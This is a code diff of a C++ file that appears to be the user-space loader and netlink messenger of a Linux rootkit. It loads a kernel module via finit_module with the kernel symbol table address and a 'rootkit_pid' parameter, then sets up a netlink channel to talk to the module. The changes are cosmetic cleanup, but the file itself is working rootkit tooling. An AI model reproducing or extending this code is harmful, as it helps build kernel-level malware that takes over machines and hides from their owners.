@@ -1,7 +1,3 @@
-//
-// Created by idan on 1/7/24.
-//
-
 #include "kernel_access.h"
 
 #include "../error_codes.h"
@@ -13,7 +9,6 @@
 #include <string>
 #include <sys/syscall.h>
 #include <fcntl.h>
-
 
 msg_to_user kernel_access::my_recv_msg() {
     size_t msg_size = sizeof(msg_to_user);
@@ -36,7 +31,7 @@ msg_to_user kernel_access::my_recv_msg() {
     resp_msghdr.msg_iov = &iov; // resp_msghdr -> iov
     resp_msghdr.msg_iovlen = 1;
 
-    recvmsg(sock_fd, &resp_msghdr, 0); // msg is also receiver for read
+    recvmsg(sock_fd, &resp_msghdr, 0);
 
     msg_to_user ret;
     memcpy((void *) &ret.data, NLMSG_DATA(nlh), sizeof(struct msg_to_user));
@@ -48,11 +43,10 @@ msg_to_user kernel_access::my_recv_msg() {
 void kernel_access::my_send_msg(msg_to_module message) {
     size_t msg_size = sizeof(msg_to_module);
 
-    //nlh: contains "Hello" msg
     struct nlmsghdr *nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(msg_size));
     memset(nlh, 0, NLMSG_SPACE(msg_size)); // initialized to zero
     nlh->nlmsg_len = NLMSG_SPACE(msg_size);
-    nlh->nlmsg_pid = getpid();  //self pid
+    nlh->nlmsg_pid = getpid(); // my pid
     nlh->nlmsg_flags = 0;
 
     memcpy(NLMSG_DATA(nlh), (void*) &message, msg_size);
@@ -101,14 +95,11 @@ kernel_access::kernel_access() {
     memset(params, '\x00', MAX_PARAMS_SIZE);
     sprintf(params, "kallsyms=%p rootkit_pid=%d", kallsyms_addr, getpid());
 
-//    syscall(SYS_delete_module, MODULE_NAME, 0); // unload previous used module
     // load the module
-    puts(MODULE_DIR);
     int fd = open(MODULE_DIR MODULE_NAME MODULE_EXT, O_RDONLY);
     if (syscall(SYS_finit_module, fd, params, 0) == SYSCALL_ERROR) {
         close(fd);
-        perror("init_module syscall error");
-        throw;
+        throw "init_module syscall error";
     }
     close(fd);
 
@@ -118,27 +109,25 @@ kernel_access::kernel_access() {
     // open socket fd
     sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
     if (sock_fd == SOCKET_ERROR) {
-        perror("socket error");
-        throw;
+        throw "socket error";
     }
 
     // setup and bind src addr
     struct sockaddr_nl src_addr;
     memset(&src_addr, 0, sizeof(src_addr));
     src_addr.nl_family = AF_NETLINK;
-    src_addr.nl_pid = getpid(); /* my pid */
+    src_addr.nl_pid = getpid();
 
     if (bind(sock_fd, (struct sockaddr *) &src_addr, sizeof(src_addr)) == BIND_ERROR) {
-        perror("bind error");
         close(sock_fd);
-        throw;
+        throw "bind error";
     }
 
     // setup destination addr
     memset(&dest_addr, 0, sizeof(dest_addr));
     dest_addr.nl_family = AF_NETLINK;
-    dest_addr.nl_pid = 0; /* For Linux Kernel */
-    dest_addr.nl_groups = 0; /* unicast */
+    dest_addr.nl_pid = 0;
+    dest_addr.nl_groups = 0;
 
 }
 
